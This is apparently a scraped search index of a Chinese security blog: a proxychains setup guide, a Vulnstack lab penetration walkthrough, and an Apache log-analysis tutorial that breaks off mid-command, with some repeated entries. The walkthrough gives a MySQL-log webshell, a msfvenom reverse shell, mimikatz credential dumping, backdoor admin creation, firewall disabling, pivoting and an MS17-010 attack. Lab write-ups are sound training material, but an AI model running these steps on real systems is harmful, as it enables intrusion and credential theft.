# defaults set to \"tor\" #socks4 127.0.0.1 9050 # example socks5 127.0.0.1 8888 proxychains 使用命令形式为： proxychains \u003c运行的命令\u003e \u003c命令参数\u003e ProxyChains 的使用方式非常简单，直接在应用程序前加上 proxychains4 即可。例如： proxychains4 git clone https://github.com/rofl0r/proxychains-ng 除此之外也可以在任何应用上使用： sudo proxychains4 apt-get update proxychains4 npm install 然而，不能这样使用 proxychains4 ping google.com [proxychains] config file found: /etc/proxychains.conf [proxychains] preloading /usr/local/lib/libproxychains4.dylib PING google.com (172.217.27.142): 56 data bytes Request timeout for icmp_seq 0 Request timeout for icmp_seq 1 Request timeout for icmp_seq 2 Request timeout for icmp_seq 3 Request timeout for icmp_seq 4 因为 proxychains 只会代理 TCP 连接，而 ping 使用的是 ICMP。 [其他配置]**dynamic_chain：**该配置项能够通过 ProxyList 中的每个代理运行流量，如果其中一 个代理关闭或者没有响应，它能够自动选择 ProxyList 中的下一个代理； **strict_chain：**改配置为 ProxyChains 的默认配置，不同于 dynamic_chain，也能够通 过 ProxyList 中的每个代理运行流量，但是如果 ProxyList 中的代理出现故障，不会自动 切换到下一个。 **random_chain：**该配置项会从 ProxyList 中随机选择代理 IP 来运行流量，如果 ProxyList 中有多个代理 IP，在使用 proxychains 的时候会使用不同的代理访问目标主机， 从而使主机端探测流量更加困难。 特别注意的是 v2ray对局域网进行监听的端口是10810(socks协议)，在proxychains的配置文件中不要写成10808 保存退出，就可以直接使用了，注意，由于新版kali的权限安全限制，使用proxychains不能是root用户 ","date":"2023-11-17","objectID":"/vmware_vpn2/:0:5","series":null,"tags":["linux"],"title":"VMware虚拟机通过物理机的vpn代理实现科学上网","uri":"/vmware_vpn2/#0x2配置与使用"},{"categories":["linux"],"content":"\r0x2配置与使用ProxyChains 的配置文件位于 /etc/proxychains.conf ，打开后在末尾添加的代理。 [ProxyList] # add proxy here ... # meanwile # defaults set to \"tor\" #socks4 127.0.0.1 9050 # example socks5 127.0.0.1 8888 proxychains 使用命令形式为： proxychains \u003c运行的命令\u003e \u003c命令参数\u003e ProxyChains 的使用方式非常简单，直接在应用程序前加上 proxychains4 即可。例如： proxychains4 git clone https://github.com/rofl0r/proxychains-ng 除此之外也可以在任何应用上使用： sudo proxychains4 apt-get update proxychains4 npm install 然而，不能这样使用 proxychains4 ping google.com [proxychains] config file found: /etc/proxychains.conf [proxychains] preloading /usr/local/lib/libproxychains4.dylib PING google.com (172.217.27.142): 56 data bytes Request timeout for icmp_seq 0 Request timeout for icmp_seq 1 Request timeout for icmp_seq 2 Request timeout for icmp_seq 3 Request timeout for icmp_seq 4 因为 proxychains 只会代理 TCP 连接，而 ping 使用的是 ICMP。 [其他配置]**dynamic_chain：**该配置项能够通过 ProxyList 中的每个代理运行流量，如果其中一 个代理关闭或者没有响应，它能够自动选择 ProxyList 中的下一个代理； **strict_chain：**改配置为 ProxyChains 的默认配置，不同于 dynamic_chain，也能够通 过 ProxyList 中的每个代理运行流量，但是如果 ProxyList 中的代理出现故障，不会自动 切换到下一个。 **random_chain：**该配置项会从 ProxyList 中随机选择代理 IP 来运行流量，如果 ProxyList 中有多个代理 IP，在使用 proxychains 的时候会使用不同的代理访问目标主机， 从而使主机端探测流量更加困难。 特别注意的是 v2ray对局域网进行监听的端口是10810(socks协议)，在proxychains的配置文件中不要写成10808 保存退出，就可以直接使用了，注意，由于新版kali的权限安全限制，使用proxychains不能是root用户 ","date":"2023-11-17","objectID":"/vmware_vpn2/:0:5","series":null,"tags":["linux"],"title":"VMware虚拟机通过物理机的vpn代理实现科学上网","uri":"/vmware_vpn2/#其他配置"},{"categories":["permeation"],"content":"Vulnstack-ATT\u0026CK(一) ","date":"2023-11-17","objectID":"/vulnstack-attck_1/:0:0","series":null,"tags":["permeation"],"title":"Vulnstack-ATT\u0026CK(一)","uri":"/vulnstack-attck_1/#"},{"categories":["permeation"],"content":"\r0x1前言红日靶场 http://vulnstack.qiyuanxuetang.net/vuln/detail/2/ 靶机初始密码 均为 hongrisec@2019 ","date":"2023-11-17","objectID":"/vulnstack-attck_1/:0:0","series":null,"tags":["permeation"],"title":"Vulnstack-ATT\u0026CK(一)","uri":"/vulnstack-attck_1/#0x1前言"},{"categories":["permeation"],"content":"\r0x2环境搭建 攻击机 kali ip 192.168.157.137 web服务器 win7 ip 192.168.157.153 192.168.52.143 域成员 win2003 ip **** 192.168.52.141 域控 win2008 ip **** 192.168.52.138 ​ 靶场提供的三个主机在同一个网段中，另外Win7主机有两张网卡，模拟可以与外网进行通信的主机，且安装有phpstudy，部署了web网站。 ​ 我们在使用VMware设置环境时，为了安全，应该设置两个网段，即新建两个VMnet，均为主机模型（这里是为了防止虚拟机上有什么病毒逃逸到自己的本机电脑上或者在操作过程中有什么错误，感染自己的电脑）。 ​ 在VMware中，需要设置一下虚拟网络编辑器，确保其中有两个仅主机模式的VMnet，其中一个VMnet的子网地址设置为192.168.52.0，命名为VMnet19，为靶场网络，对Win server2003和Win server2008均配置静态IP，且属于192.168.52.0/24网段。攻击机kali所用的网卡名为VMnet19，网络地址设置为192.168.60.0。win7配置了VMnet19和VMnet18双网卡。 ","date":"2023-11-17","objectID":"/vulnstack-attck_1/:0:0","series":null,"tags":["permeation"],"title":"Vulnstack-ATT\u0026CK(一)","uri":"/vulnstack-attck_1/#0x2环境搭建"},{"categories":["permeation"],"content":"\r0x3web渗透","date":"2023-11-17","objectID":"/vulnstack-attck_1/:0:0","series":null,"tags":["permeation"],"title":"Vulnstack-ATT\u0026CK(一)","uri":"/vulnstack-attck_1/#0x3web渗透"},{"categories":["permeation"],"content":"\r1.信息收集","date":"2023-11-17","objectID":"/vulnstack-attck_1/:1:0","series":null,"tags":["permeation"],"title":"Vulnstack-ATT\u0026CK(一)","uri":"/vulnstack-attck_1/#1信息收集"},{"categories":["permeation"],"content":"\r探测内网存活 netdiscover -i eth0 -r 192.168.60.0/24 目标靶机ip为192.168.60.128 (254是DHCP服务器地址) ","date":"2023-11-17","objectID":"/vulnstack-attck_1/:1:1","series":null,"tags":["permeation"],"title":"Vulnstack-ATT\u0026CK(一)","uri":"/vulnstack-attck_1/#探测内网存活"},{"categories":["permeation"],"content":"\r端口扫描\u0026及目录爆破 nmap 192.168.60.130 （启用了DHCP服务，重启后ip发生变化） 这是一般情况下的扫描结果，只能探测到80和3306端口 下面是将win7靶机的防火墙全部关掉的扫描结果，爆出了更多的端口 进一步探测 nmap -sC -sV -Pn -p 1-65535 192.168.60.130 常用扫描工具有：dirsearch、dirmap、御剑，kali自带的dirbuster、nikto，使用多个扫描工具进行探测，可能会发现不同的扫描结果。 开启了80端口，我们可以访问一下 页面下方有sql连接测试的接口，尝试phpstudy的默认账密root/root，连接成功 御剑爆网站目录 dirsearch爆网站目录 扫描工具很多，能不能扫出有用信息还是看字典是否强大。 另外我们还可以通过nikto扫描来获取相关信息 nikto -h 192.168.60.130 发现后台页面路径 尝试root/root也能登上 ","date":"2023-11-17","objectID":"/vulnstack-attck_1/:1:2","series":null,"tags":["permeation"],"title":"Vulnstack-ATT\u0026CK(一)","uri":"/vulnstack-attck_1/#端口扫描及目录爆破"},{"categories":["permeation"],"content":"\r2.利用sql写文件getshell一般利用mysql获取shell的方法有以下几种： select ‘一句话木马’ into dumpfile/outfile ‘绝对路径’ 条件1：secure_file_priv变量非NULL，表示支持数据导入导出 条件2：用户拥有root权限 条件3：知道当前网站的绝对路径 利用日志文件 ","date":"2023-11-17","objectID":"/vulnstack-attck_1/:2:0","series":null,"tags":["permeation"],"title":"Vulnstack-ATT\u0026CK(一)","uri":"/vulnstack-attck_1/#2利用sql写文件getshell"},{"categories":["permeation"],"content":"\r判断步骤如下：查看secure-file-priv值，为NULL时表示禁止导入导出，且无法通过sql语句对该属性值进行修改，说明第1种方式行不通 我们可以通过以下sql语句进行查询 show variables like \"%secure%\"; 可见secure_file_priv的值为null，要想修改 Value值 只能修改配置文件 mysql.ini(linux修改配置文件：my.cnf)，所以第一种方法行不通 查看是否开启日志记录以及日志保存目录 SHOW VARIABLES LIKE '%general_log%' 为OFF，但可使用SET语句设置为ON set global general_log =\"on\"; 并将日志保存路径设置为php文件 set global general_log_file=\"C:/phpStudy/www/1.php\"; 再执行一条一句话木马语句，该语句会被记录到日志文件中 select '\u003c?php eval($_POST[\"cmd\"]);?\u003e'; 此时，我们已经成功将一句话木马写入主机，然后就可以使用蚁剑或菜刀进行连接，成功getshell ","date":"2023-11-17","objectID":"/vulnstack-attck_1/:2:1","series":null,"tags":["permeation"],"title":"Vulnstack-ATT\u0026CK(一)","uri":"/vulnstack-attck_1/#判断步骤如下"},{"categories":["permeation"],"content":"\r另外我们也可以通过扫描到的cms管理页面进行getshell(账密网站页面直接写了)\r登录后可对网站整体内容进行管理，其中可以对模板文件进行编辑，这样就可以向模板文件中增加一句话木马进行连接来getshell。 直接用蚁剑连就可以了 同时该cms还存在xss、sql注入等漏洞，但利用价值不大 ","date":"2023-11-17","objectID":"/vulnstack-attck_1/:2:2","series":null,"tags":["permeation"],"title":"Vulnstack-ATT\u0026CK(一)","uri":"/vulnstack-attck_1/#另外我们也可以通过扫描到的cms管理页面进行getshell账密网站页面直接写了"},{"categories":["permeation"],"content":"\r3.(拿下webshell后信息收集)内网信息收集到目前为止，相当于我们已经获取了Win7的控制权，如果想进一步对内网段中其他主机的控制权，便需要进一步收集信息。例如，网段名、域用户、域控IP、管理员信息等等。而内网渗透的终极目标就是控制域控服务器，进而控制整个内网段。 内网信息收集可以考虑以下几种方式： 1.直接在蚁剑中打开终端执行命令–\u003e相当于是在win7的终端上执行各种命令 2.利用蚁剑上传msf反弹木马，执行后反弹shell到msf，在msf中执行命令–\u003e可以利用msf封装的其他命令，但该工具的优点在于一台机器的不断渗透，缺点是有点不稳定，容易掉线。 3.利用蚁剑上传CS反弹木马，执行后反弹shell到CS，然后在CS中执行命令–\u003e可以利用CS提供的其他命令，能较方便的获取同内网其他主机的信息，并获取其他主机的控制权，但是命令执行后的结果返回特别慢，所以如果仅仅是执行一些收集主机信息的命令，建议不要用CS。 ","date":"2023-11-17","objectID":"/vulnstack-attck_1/:3:0","series":null,"tags":["permeation"],"title":"Vulnstack-ATT\u0026CK(一)","uri":"/vulnstack-attck_1/#3拿下webshell后信息收集内网信息收集"},{"categories":["permeation"],"content":"\r基本信息收集常用命令： ipconfig /all 查看本机ip，所在域 route print 打印路由信息 net view 查看局域网内其他主机名 arp -a 查看arp缓存 net start 查看开启了哪些服务 net share 查看开启了哪些共享 net share ipc$ 开启ipc共享 net share c$ 开启c盘共享 net use \\\\192.168.xx.xx\\ipc$ \"\" /user:\"\" 与192.168.xx.xx建立空连接 net use \\\\192.168.xx.xx\\c$ \"密码\" /user:\"用户名\" 建立c盘共享 dir \\\\192.168.xx.xx\\c$\\user 查看192.168.xx.xx c盘user目录下的文件 net config Workstation 查看计算机名、全名、用户名、系统版本、工作站、域、登录域 net user 查看本机用户列表 net user /domain 查看域用户 net localgroup administrators 查看本地管理员组（通常会有域用户） net view /domain 查看有几个域 net user 用户名 /domain 获取指定域用户的信息 net group /domain 查看域里面的工作组，查看把用户分了多少组（只能在域控上操作） net group 组名 /domain 查看域中某工作组 net group \"domain admins\" /domain 查看域管理员的名字 net group \"domain computers\" /domain 查看域中的其他主机名 net group \"doamin controllers\" /domain 查看域控制器（可能有多台） netstat -ano | find \"3389\" 查看3389端口是否开启，若开启可以尝试远程桌面登录（Windows） REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal\" \"Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f 用于开启远程桌面登录 尝试远程桌面登录 ","date":"2023-11-17","objectID":"/vulnstack-attck_1/:3:1","series":null,"tags":["permeation"],"title":"Vulnstack-ATT\u0026CK(一)","uri":"/vulnstack-attck_1/#基本信息收集"},{"categories":["permeation"],"content":"\r尝试远程桌面登录判断3389端口是否开放 netstat -ano| find \"3389\" 在蚁剑shell执行，发现并没有，这里猜测是被防火墙屏蔽了 在蚁剑shell输入一下命令，尝试开放3389端口 REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal\" \"Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f 新建用户名，并添加到管理员组 net user 查看用户账号名 net user username password /add 新建用户 net localgroup administrators username /add 将新用户添加到管理员组 ps：要注意这里新建用户时，新用户的密码有强度限制，如果设置的太简单将无法添加。 rdp连不上，可能是被防火墙屏蔽了 关闭防火墙 netsh advfirewall set allprofiles state off 随后就可以连接了 ","date":"2023-11-17","objectID":"/vulnstack-attck_1/:3:2","series":null,"tags":["permeation"],"title":"Vulnstack-ATT\u0026CK(一)","uri":"/vulnstack-attck_1/#尝试远程桌面登录"},{"categories":["permeation"],"content":"\r0x4后渗透","date":"2023-11-17","objectID":"/vulnstack-attck_1/:0:0","series":null,"tags":["permeation"],"title":"Vulnstack-ATT\u0026CK(一)","uri":"/vulnstack-attck_1/#0x4后渗透"},{"categories":["permeation"],"content":"\rmsf上线这里的思路是将shell派送给CS或者msf进行下一步渗透。 使用msf生成exe并开启监听(也可以用cs生产exe)： msfvenom -p windows/meterpreter_reverse_tcp LHOST=192.168.126.129 LPORT=2333 -f exe -o /root/run.exe **tips：**这边的locaohost(lhost)是攻击机kali的ip地址，千万不要填成靶机ip 通过蚁剑上传并执行 在shell里执行run.exe 在kali中进入msf相关模块: msfconsole use multi/handler set payload windows/x64/meterpreter_reverse_tcp set lhost 192.168.126.129 set lport 2333 exploit -j(后台)允许 随后通过sessions命令来查看反弹回来的shell 随后sessions -i 1进入这个session ","date":"2023-11-17","objectID":"/vulnstack-attck_1/:1:0","series":null,"tags":["permeation"],"title":"Vulnstack-ATT\u0026CK(一)","uri":"/vulnstack-attck_1/#msf上线"},{"categories":["permeation"],"content":"\r提权system：这里已经是system权限了，如果是administrator的话，需要先提权getsystem 一般提权流程： sysinfo getuid (发现是administor权限) getsystem (获取system权限) 随后获取账号密码： run hashdump 不知道为啥我除了一堆报错 除了hashdump，msf提供了一个用来获取域内用户hash的脚本，执行以下代码： run post/windows/gather/smart_hashdump 然后把mimikatz上传到靶机 upload /root/mimikatz.exe C:\\\\ //然后进入靶机的shell，运行mimikatz 对mimikatz进行提权 privilege::debug ","date":"2023-11-17","objectID":"/vulnstack-attck_1/:1:1","series":null,"tags":["permeation"],"title":"Vulnstack-ATT\u0026CK(一)","uri":"/vulnstack-attck_1/#提权system"},{"categories":["permeation"],"content":"\r抓取密码 sekurlsa::logonPasswords 看了其他大佬的博客，发现有更方便的方法： 1.导入账号密码hash值： run hashdump 2.mimikatz 加载mimikatz模块，加载模块前需要先将meterpreter迁移到64位的进程(需要system权限)： ps migrate PID load mimikatz mimikatz_command -f sekurlsa::searchPasswords 3.kiwi load wiki creds_all ","date":"2023-11-17","objectID":"/vulnstack-attck_1/:1:2","series":null,"tags":["permeation"],"title":"Vulnstack-ATT\u0026CK(一)","uri":"/vulnstack-attck_1/#抓取密码"},{"categories":["permeation"],"content":"\r开启3389 run post/windows/manage/enable_rdp ","date":"2023-11-17","objectID":"/vulnstack-attck_1/:1:3","series":null,"tags":["permeation"],"title":"Vulnstack-ATT\u0026CK(一)","uri":"/vulnstack-attck_1/#开启3389"},{"categories":["permeation"],"content":"\r内网搜集 ipconfig 看到win7的另一个网卡的ip (中文字符编码问题出现的乱码，将就看吧) //解决乱码问题 chcp 65001 使用ipconfig /all查看DNS服务器，推测DNS服务器名为god.org： 查看域信息：net view 查看主域信息：net view /domain ","date":"2023-11-17","objectID":"/vulnstack-attck_1/:1:4","series":null,"tags":["permeation"],"title":"Vulnstack-ATT\u0026CK(一)","uri":"/vulnstack-attck_1/#内网搜集"},{"categories":["permeation"],"content":"\r0x5横向渗透","date":"2023-11-17","objectID":"/vulnstack-attck_1/:0:0","series":null,"tags":["permeation"],"title":"Vulnstack-ATT\u0026CK(一)","uri":"/vulnstack-attck_1/#0x5横向渗透"},{"categories":["permeation"],"content":"\r添加路由查看路由信息，添加路由到目标网络，以此使得MSF能够通过Win7路由转发访问,使得msf命令能够通过win7 访问到内网 查看目标机器所在内网网端信息与公网网端信息： run get_local_subnets 添加内网路由 使得msf6能通过win7路由转发访问内网192.168.52.0/24网段： run autoroute -s 192.168.52.0/24 ","date":"2023-11-17","objectID":"/vulnstack-attck_1/:1:0","series":null,"tags":["permeation"],"title":"Vulnstack-ATT\u0026CK(一)","uri":"/vulnstack-attck_1/#添加路由"},{"categories":["permeation"],"content":"\r扫描192.168.52.0/24网段： run post/windows/gather/arp_scanner RHOSTS=192.168.52.0/24 ","date":"2023-11-17","objectID":"/vulnstack-attck_1/:2:0","series":null,"tags":["permeation"],"title":"Vulnstack-ATT\u0026CK(一)","uri":"/vulnstack-attck_1/#扫描19216852024网段"},{"categories":["permeation"],"content":"\r扫描存活主机:先从win7的meterpreter session中退出来，执行： use auxiliary/scanner/netbios/nbname set rhosts 192.168.52.130 run ","date":"2023-11-17","objectID":"/vulnstack-attck_1/:3:0","series":null,"tags":["permeation"],"title":"Vulnstack-ATT\u0026CK(一)","uri":"/vulnstack-attck_1/#扫描存活主机"},{"categories":["permeation"],"content":"\r内网端口信息： use auxiliary/scanner/portscan/tcp ","date":"2023-11-17","objectID":"/vulnstack-attck_1/:4:0","series":null,"tags":["permeation"],"title":"Vulnstack-ATT\u0026CK(一)","uri":"/vulnstack-attck_1/#内网端口信息"},{"categories":["permeation"],"content":"\r挂socks4a代理挂代理是为了让其他工具能够通过win7 ，去访问192.168.52.0/24 网段 配置msf代理： use auxiliary/server/socks_proxy show options set version 4a show options set srvport 1080 run 如果proxychains配置终端代理出现问题 修改一下文件/etc/proxychains4.config 再开一个终端nano编辑proxychains4.config，把端口改成1080，记得用root身份 设置代理成功后 使用其他工具时需要添加proxychains ","date":"2023-11-17","objectID":"/vulnstack-attck_1/:5:0","series":null,"tags":["permeation"],"title":"Vulnstack-ATT\u0026CK(一)","uri":"/vulnstack-attck_1/#挂socks4a代理"},{"categories":["permeation"],"content":"\r渗透win2003(远程登录)","date":"2023-11-17","objectID":"/vulnstack-attck_1/:6:0","series":null,"tags":["permeation"],"title":"Vulnstack-ATT\u0026CK(一)","uri":"/vulnstack-attck_1/#渗透win2003远程登录"},{"categories":["permeation"],"content":"\r信息收集扫描主机版本 use auxiliary/scanner/smb/smb_version set rhosts 192.168.52.141 run (emm，一开始没看到141就把前几个都扫了一遍。。。。) Nmap扫描 192.168.52.141 proxychains nmap -Pn -sT 192.168.52.141 ","date":"2023-11-17","objectID":"/vulnstack-attck_1/:6:1","series":null,"tags":["permeation"],"title":"Vulnstack-ATT\u0026CK(一)","uri":"/vulnstack-attck_1/#信息收集"},{"categories":["permeation"],"content":"\r尝试攻击由nmap看到开放445端口 尝试永恒之蓝攻击win2003 use exploit/windows/smb/ms17_010_psexec set payload windows/meterpreter/bind_tcp set rhosts 192.168.52.141 run 经过了几次尝试，没有打下来 可以尝试执行一些系统权限命令，比如添加管理员账户尝试3389登录 use auxiliary/admin/smb/ms17_010_command show options set rhosts 192.168.52.141 //添加用户 set command net user kun hongrisec@2019 /add //提升管理员权限 set command net localgroup administrators kun /add run //开启3389端口 set command 'REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal\" \"Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f' run 然后使用proxychains4连接win2003的3389(kun用户登录) 。。。。。。。。。。 没搞完，先搁着吧 ​ ","date":"2023-11-17","objectID":"/vulnstack-attck_1/:6:2","series":null,"tags":["permeation"],"title":"Vulnstack-ATT\u0026CK(一)","uri":"/vulnstack-attck_1/#尝试攻击"},{"categories":["permeation"],"content":"\rmsf联动cobaltstrikemsf获取到shell后，可以派发给cobaltstrike 首先cobaltstrike创建监听器： ","date":"2023-11-17","objectID":"/vulnstack-attck_1/:0:0","series":null,"tags":["permeation"],"title":"Vulnstack-ATT\u0026CK(一)","uri":"/vulnstack-attck_1/#msf联动cobaltstrike"},{"categories":["web"],"content":"web流量审计与日志分析基础 ","date":"2023-11-17","objectID":"/log_analysis/:0:0","series":null,"tags":["web"],"title":"web流量审计与日志分析","uri":"/log_analysis/#"},{"categories":["web"],"content":"\rweb日志分析基础：这里以Apache日志分析为例： Apache日志大致分为两类：访问日志和错误日志 ","date":"2023-11-17","objectID":"/log_analysis/:1:0","series":null,"tags":["web"],"title":"web流量审计与日志分析","uri":"/log_analysis/#web日志分析基础"},{"categories":["web"],"content":"\r访问日志记录的过程： 客户端向web服务器发送请求，请求中包含客户端的IP、浏览器类型(User-Agent)、请示的URL等信息 web服务器向客户端返回请示的页面 web服务器同时将访问信息和状态信息记录到日志文件中 Apache的访问日志目录在其配置文件中已经定义好了，CentOS中apache的配置文件位置为/etc/httpd/conf/httpd.conf,默认的访问日志存放在/var/log/httpd/access_log中 我的站点面是用宝塔创建的，具体站点Apache日志在上面的图片中可见 ","date":"2023-11-17","objectID":"/log_analysis/:1:1","series":null,"tags":["web"],"title":"web流量审计与日志分析","uri":"/log_analysis/#访问日志记录的过程"},{"categories":["web"],"content":"\r访问日志格式分析:apache中访问日志功能由mod_log_config模块提供，以默认的CLF来记录访问日志，如LogFormat “%h%l%u%t %r” 付一张图片，来自我的公网服务器网站Apache流量 ","date":"2023-11-17","objectID":"/log_analysis/:1:2","series":null,"tags":["web"],"title":"web流量审计与日志分析","uri":"/log_analysis/#访问日志格式分析"},{"categories":["web"],"content":"\rWeb日志统计:\r查看访问IP cat access_log | awk '{print $1}' awk ‘{print $1}’ - 每行按空格或TAB分割，输出文本中的第1项，因为在access_log中的IP是第一项，所以这里用$1表示 打印每一重复行出现的次数 cat access_log | awk '{print $1}' | sort | uniq -c uniq用于检查及删除文本中重复出现的行列，一般与sort结合使用 -c - 在每列旁边显示该行重复出现的次数 排序并统计行数 cat access_log | awk '{print $1}' | sort | uniq -c | sort -rn | wc -l sort 用于对文本文件内容进行排序，默认以ASCII码的次序排列 -r 以相反的顺序来排序 -n 依照数值的大小排序 wc用于打印文件的文本行数、单词数、字节数等 -l 打印指定文件的文本行数 显示访问前10位的IP地址 cat access_log | awk '{print $1}' | sort | uniq -c | sort -rn | heade -10 显示指定时间以后的日志 cat access_log | awk '$4\u003e=\"[10/Apr/2022:01:00:01]\"' access_log 找出访问量最大的IP，并封掉 cat access_log | awk '{print $1}' | sort | uniq -c | sort -rn | more iptables -I INPUT -s 192.168.1.10 -j DROP iptables -I INPUT -s 192.168.1.0/24 -j DROP 找出下载最多的文件 cat access_log | awk '($7 ~/.exe/){print $10 \"\" $1 \"\" $4 \"\" $7}' | sort -n | uniq -c | sort -nr | head -10 或找出文件大于10MB的文件： cat access_log | awk '($10 \u003e 10000000 \u0026\u0026 $7 ~/.exe){print $7}' | sort -n | uniq -c | sort -nr | head -10 简单统计流量 cat access_log | awk '{sum+=$10}' 统计401访问拒绝的数量 cat access_log | awk '(/401/)' | wc -l 查看某一时间内的IP连接情况 grep \"2022:04\" access_log | awk '{print $4}' | sort | uniq -c | sort -nr ","date":"2023-11-17","objectID":"/log_analysis/:1:3","series":null,"tags":["web"],"title":"web流量审计与日志分析","uri":"/log_analysis/#web日志统计"},{"categories":["web"],"content":"\rWeb日志统计:\r查看访问IP cat access_log | awk '{print $1}' awk ‘{print $1}’ - 每行按空格或TAB分割，输出文本中的第1项，因为在access_log中的IP是第一项，所以这里用$1表示 打印每一重复行出现的次数 cat access_log | awk '{print $1}' | sort | uniq -c uniq用于检查及删除文本中重复出现的行列，一般与sort结合使用 -c - 在每列旁边显示该行重复出现的次数 排序并统计行数 cat access_log | awk '{print $1}' | sort | uniq -c | sort -rn | wc -l sort 用于对文本文件内容进行排序，默认以ASCII码的次序排列 -r 以相反的顺序来排序 -n 依照数值的大小排序 wc用于打印文件的文本行数、单词数、字节数等 -l 打印指定文件的文本行数 显示访问前10位的IP地址 cat access_log | awk '{print $1}' | sort | uniq -c | sort -rn | heade -10 显示指定时间以后的日志 cat access_log | awk '$4\u003e=\"[10/Apr/2022:01:00:01]\"' access_log 找出访问量最大的IP，并封掉 cat access_log | awk '{print $1}' | sort | uniq -c | sort -rn | more iptables -I INPUT -s 192.168.1.10 -j DROP iptables -I INPUT -s 192.168.1.0/24 -j DROP 找出下载最多的文件 cat access_log | awk '($7 ~/.exe/){print $10 \"\" $1 \"\" $4 \"\" $7}' | sort -n | uniq -c | sort -nr | head -10 或找出文件大于10MB的文件： cat access_log | awk '($10 \u003e 10000000 \u0026\u0026 $7 ~/.exe){print $7}' | sort -n | uniq -c | sort -nr | head -10 简单统计流量 cat access_log | awk '{sum+=$10}' 统计401访问拒绝的数量 cat access_log | awk '(/401/)' | wc -l 查看某一时间内的IP连接情况 grep \"2022:04\" access_log | awk '{print $4}' | sort | uniq -c | sort -nr ","date":"2023-11-17","objectID":"/log_analysis/:1:3","series":null,"tags":["web"],"title":"web流量审计与日志分析","uri":"/log_analysis/#查看访问ip"},{"categories":["web"],"content":"\rWeb日志统计:\r查看访问IP cat access_log | awk '{print $1}' awk ‘{print $1}’ - 每行按空格或TAB分割，输出文本中的第1项，因为在access_log中的IP是第一项，所以这里用$1表示 打印每一重复行出现的次数 cat access_log | awk '{print $1}' | sort | uniq -c uniq用于检查及删除文本中重复出现的行列，一般与sort结合使用 -c - 在每列旁边显示该行重复出现的次数 排序并统计行数 cat access_log | awk '{print $1}' | sort | uniq -c | sort -rn | wc -l sort 用于对文本文件内容进行排序，默认以ASCII码的次序排列 -r 以相反的顺序来排序 -n 依照数值的大小排序 wc用于打印文件的文本行数、单词数、字节数等 -l 打印指定文件的文本行数 显示访问前10位的IP地址 cat access_log | awk '{print $1}' | sort | uniq -c | sort -rn | heade -10 显示指定时间以后的日志 cat access_log | awk '$4\u003e=\"[10/Apr/2022:01:00:01]\"' access_log 找出访问量最大的IP，并封掉 cat access_log | awk '{print $1}' | sort | uniq -c | sort -rn | more iptables -I INPUT -s 192.168.1.10 -j DROP iptables -I INPUT -s 192.168.1.0/24 -j DROP 找出下载最多的文件 cat access_log | awk '($7 ~/.exe/){print $10 \"\" $1 \"\" $4 \"\" $7}' | sort -n | uniq -c | sort -nr | head -10 或找出文件大于10MB的文件： cat access_log | awk '($10 \u003e 10000000 \u0026\u0026 $7 ~/.exe){print $7}' | sort -n | uniq -c | sort -nr | head -10 简单统计流量 cat access_log | awk '{sum+=$10}' 统计401访问拒绝的数量 cat access_log | awk '(/401/)' | wc -l 查看某一时间内的IP连接情况 grep \"2022:04\" access_log | awk '{print $4}' | sort | uniq -c | sort -nr ","date":"2023-11-17","objectID":"/log_analysis/:1:3","series":null,"tags":["web"],"title":"web流量审计与日志分析","uri":"/log_analysis/#打印每一重复行出现的次数"},{"categories":["web"],"content":"\rWeb日志统计:\r查看访问IP cat access_log | awk '{print $1}' awk ‘{print $1}’ - 每行按空格或TAB分割，输出文本中的第1项，因为在access_log中的IP是第一项，所以这里用$1表示 打印每一重复行出现的次数 cat access_log | awk '{print $1}' | sort | uniq -c uniq用于检查及删除文本中重复出现的行列，一般与sort结合使用 -c - 在每列旁边显示该行重复出现的次数 排序并统计行数 cat access_log | awk '{print $1}' | sort | uniq -c | sort -rn | wc -l sort 用于对文本文件内容进行排序，默认以ASCII码的次序排列 -r 以相反的顺序来排序 -n 依照数值的大小排序 wc用于打印文件的文本行数、单词数、字节数等 -l 打印指定文件的文本行数 显示访问前10位的IP地址 cat access_log | awk '{print $1}' | sort | uniq -c | sort -rn | heade -10 显示指定时间以后的日志 cat access_log | awk '$4\u003e=\"[10/Apr/2022:01:00:01]\"' access_log 找出访问量最大的IP，并封掉 cat access_log | awk '{print $1}' | sort | uniq -c | sort -rn | more iptables -I INPUT -s 192.168.1.10 -j DROP iptables -I INPUT -s 192.168.1.0/24 -j DROP 找出下载最多的文件 cat access_log | awk '($7 ~/.exe/){print $10 \"\" $1 \"\" $4 \"\" $7}' | sort -n | uniq -c | sort -nr | head -10 或找出文件大于10MB的文件： cat access_log | awk '($10 \u003e 10000000 \u0026\u0026 $7 ~/.exe){print $7}' | sort -n | uniq -c | sort -nr | head -10 简单统计流量 cat access_log | awk '{sum+=$10}' 统计401访问拒绝的数量 cat access_log | awk '(/401/)' | wc -l 查看某一时间内的IP连接情况 grep \"2022:04\" access_log | awk '{print $4}' | sort | uniq -c | sort -nr ","date":"2023-11-17","objectID":"/log_analysis/:1:3","series":null,"tags":["web"],"title":"web流量审计与日志分析","uri":"/log_analysis/#显示访问前10位的ip地址"},{"categories":["web"],"content":"\rWeb日志统计:\r查看访问IP cat access_log | awk '{print $1}' awk ‘{print $1}’ - 每行按空格或TAB分割，输出文本中的第1项，因为在access_log中的IP是第一项，所以这里用$1表示 打印每一重复行出现的次数 cat access_log | awk '{print $1}' | sort | uniq -c uniq用于检查及删除文本中重复出现的行列，一般与sort结合使用 -c - 在每列旁边显示该行重复出现的次数 排序并统计行数 cat access_log | awk '{print $1}' | sort | uniq -c | sort -rn | wc -l sort 用于对文本文件内容进行排序，默认以ASCII码的次序排列 -r 以相反的顺序来排序 -n 依照数值的大小排序 wc用于打印文件的文本行数、单词数、字节数等 -l 打印指定文件的文本行数 显示访问前10位的IP地址 cat access_log | awk '{print $1}' | sort | uniq -c | sort -rn | heade -10 显示指定时间以后的日志 cat access_log | awk '$4\u003e=\"[10/Apr/2022:01:00:01]\"' access_log 找出访问量最大的IP，并封掉 cat access_log | awk '{print $1}' | sort | uniq -c | sort -rn | more iptables -I INPUT -s 192.168.1.10 -j DROP iptables -I INPUT -s 192.168.1.0/24 -j DROP 找出下载最多的文件 cat access_log | awk '($7 ~/.exe/){print $10 \"\" $1 \"\" $4 \"\" $7}' | sort -n | uniq -c | sort -nr | head -10 或找出文件大于10MB的文件： cat access_log | awk '($10 \u003e 10000000 \u0026\u0026 $7 